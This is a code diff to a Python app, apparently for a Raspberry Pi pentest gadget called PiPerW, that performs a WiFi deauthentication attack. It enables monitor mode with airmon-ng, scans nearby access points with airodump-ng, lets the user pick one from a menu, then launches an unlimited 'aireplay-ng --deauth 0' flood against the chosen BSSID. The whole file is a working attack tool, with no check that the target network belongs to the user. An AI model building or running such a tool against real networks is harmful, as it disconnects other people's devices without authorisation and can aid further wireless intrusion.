@@ -1,5 +1,4 @@
-
-from PiPerW.apps.app_interface import AppInterface
+from PiPerW.interfaces.app_interface import AppInterface
 from PiPerW.driver.pheripherals import Pheripherals
 from PiPerW.driver.display import Display
 from PiPerW.helpers import Log, Config
@@ -7,109 +6,136 @@ from PiPerW.utils.Menu import Menu
 import os, time, subprocess
 import csv
 import shutil
-from datetime import datetime
+import glob
 
 display = Display()
 pheripherals = Pheripherals()
 
-
-
 class App(AppInterface):
-    
-    name = "Wifi Deauth"
-    version = "0.1"
-    
+
     def __init__(self):
-        super().__init__(self.name, self.version)
+        super().__init__()
         self.menu = None
         self.ap = []
-        
+        self.mon_interface = Config['network']['interface'] + "mon"
+
     def init(self):
-        self.screen_and_log("Initializing Wifi Deauth","w")
+        self.screen_and_log("Initializing \nWiFi Deauth","w")
         time.sleep(1)
-        
-                
-        # checking if old csv files are generated
-        for file_name in os.listdir("PiPerW/tmp"):
-            if file_name.endswith(".csv"):
-                os.remove(f"PiPerW/tmp/{file_name}")
-        
-        
-        self.screen_and_log("Killing conflicting processes")
-        process_kill =  subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
 
-        self.screen_and_log("Enabling Monitor Mode")
-        monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", Config['network']['interface']], capture_output=True)
-        
-        time.sleep(5)
-        
-        self.screen_and_log("Checking if monitor mode is enabled")
+        # clear tmp files
+        for f in glob.glob("PiPerW/tmp/scan*"):
+            try:
+                os.remove(f)
+            except:
+                pass
+
+
+        self.screen_and_log("Killing config\nprocesses")
+        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
+
+        self.screen_and_log(f"Enabling Monitor\nMode on\n{Config['network']['interface']}")
+        # Try finding if interface is already mon
         iwconfig_res = subprocess.run(["iwconfig"], capture_output=True, text=True)
-        if "mon" not in iwconfig_res.stdout and "mon" not in iwconfig_res.stderr:
-            self.screen_and_log("Error enabling monitor mode not enabled, Error 4","e")
-            raise SystemError("Error enabling monitor mode not enabled, Error 4")
+        if "Monitor" in iwconfig_res.stdout and self.mon_interface in iwconfig_res.stdout:
+            Log.info("Monitor already enabled")
+        else:
+            subprocess.run(["sudo", "airmon-ng", "start", Config['network']['interface']], capture_output=True)
+            time.sleep(2)
         
+        # Verify the actual monitor interface created
+        iwconfig_res = subprocess.run(["iwconfig"], capture_output=True, text=True)
+        actual_mon = None
+        for line in iwconfig_res.stdout.split('\n'):
+            if "Monitor" in line or "Mode:Monitor" in line:
+                # the line above usually has the interface or it's the same line
+                pass
         
-        self.screen_and_log("Scanning for networks\n\nPress any key to stop")
-        
-        # We must use Popen, otherwise it blocks forever!
-        scan = subprocess.Popen(["sudo", "airodump-ng", Config['network']['interface']+"mon", "--output-format", "csv", "-w", "PiPerW/tmp/scan"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # simple check
+        if self.mon_interface not in iwconfig_res.stdout:
+            # fallback: maybe it didn't rename it
+            if Config['network']['interface'] in iwconfig_res.stdout and "Monitor" in iwconfig_res.stdout:
+                self.mon_interface = Config['network']['interface']
+            else:
+                self.screen_and_log("Error enabling\nmonitor mode","e")
+                self.wait_for_input()
+                return
 
+        self.screen_and_log("Scanning...\n\n[Press any key \nto stop]")
+
+        scan = subprocess.Popen(["sudo", "airodump-ng", self.mon_interface, "--output-format", "csv", "-w", "PiPerW/tmp/scan"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
         self.wait_for_input()
 
         self.screen_and_log("Stopping scan")
         scan.terminate()
         subprocess.run(["sudo", "killall", "airodump-ng"], capture_output=True)
-        
-        
+        time.sleep(1)
+
+        csv_file = 'PiPerW/tmp/scan-01.csv'
+        if not os.path.exists(csv_file):
+            self.screen_and_log("No networks\nfound.\n\n[Press any key]")
+            self.wait_for_input()
+            return
+
         fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
-        with open('PiPerW/tmp/scan-01.csv', 'r') as csvfile:
+        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as csvfile:
             reader = csv.DictReader(csvfile, fieldnames)
             for row in reader:
-                if row['BSSID'] != "BSSID":
-                    pass
+                if row['BSSID'] == "BSSID":
+                    continue
                 elif row['BSSID'] == "Station MAC":
                     break
                 else:
-                    if(row['BSSID'] not in self.ap):
-                        self.ap.append(row)
-                        
-        self.screen_and_log("Select the BSSID to deauth\n\nPress any key to continue")
-        self.wait_for_input()
+                    try:
+                        bssid = row.get('BSSID', '').strip()
+                        ssid = row.get('ESSID', '').strip()
+                        if bssid and bssid not in [a['BSSID'] for a in self.ap]:
+                            self.ap.append(row)
+                    except:
+                        pass
 
-        bssid = []
+        if not self.ap:
+            self.screen_and_log("No APs found.\n\n[Press any key]")
+            self.wait_for_input()
+            return
+
+        bssid_list = []
         for i in self.ap:
-            bssid.append(i['BSSID'])
-        
-        selector = Menu(bssid)
-        
-        display.draw(selector.generate())
+            name = (i.get('ESSID', '').strip() or "<Hidden>")[:10]
+            bssid_list.append(f"{name} {i['BSSID']}")
+
+        bssid_list.append("Exit")
+        selector = Menu(bssid_list, "Select AP:")
+
+        display.clear()
+        selector.show()
         while not self.is_stopped():
             key = self.wait_for_input()
             if key == "up":
                 selector.previous()
-                display.draw(selector.generate())
+                selector.show()
             elif key == "down":
                 selector.next()
-                display.draw(selector.generate())
+                selector.show()
             elif key == "select":
                 break
             elif key == "back":
-                self.screen_and_log("Exiting\n\nPress any key to continue")
-                self.wait_for_input()
                 return
 
-        selected = selector.get_selected()
-        self.screen_and_log("Deauthing:\n{}".format(selected))
+        idx = selector.index
+        if idx == len(bssid_list) -1:
+            return
+
+        target_ap = self.ap[idx]
+        bssid_mac = target_ap['BSSID']
+        channel = target_ap['channel'].strip()
+
+        self.screen_and_log(f"Setting Ch {channel}")
+        subprocess.run(["sudo", "iwconfig", self.mon_interface, "channel", channel], capture_output=True)
         
-        # change to desired channel
-        self.screen_and_log("Changing to desired channel")
-        channel = subprocess.run(["sudo", "iwconfig", Config['network']['interface']+"mon", "channel", self.ap[selected]['channel']], capture_output=True)
-        
-        # deauth        
-        deauth = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", selected, Config['network']['interface']+"mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        self.screen_and_log("Executing deauth\n\nPress back to stop")
+        self.screen_and_log(f"Deauthing:\n{bssid_mac}\n\n[Press BACK \nto stop]")
+        deauth = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid_mac, self.mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         while not self.is_stopped():
             key = self.wait_for_input()
@@ -119,16 +145,13 @@ class App(AppInterface):
                 subprocess.run(["sudo", "killall", "aireplay-ng"], capture_output=True)
                 break
 
-        
-     
-        
     def screen_and_log(self, message, type="i"):
         if type == "i":
-            Log.info(message)
+            Log.info(message.replace('\n',' '))
         elif type == "w":
-            Log.warning(message)
+            Log.warning(message.replace('\n',' '))
         elif type == "e":
-            Log.error(message)            
+            Log.error(message.replace('\n',' '))
         display.text(message)
 
     def run(self):
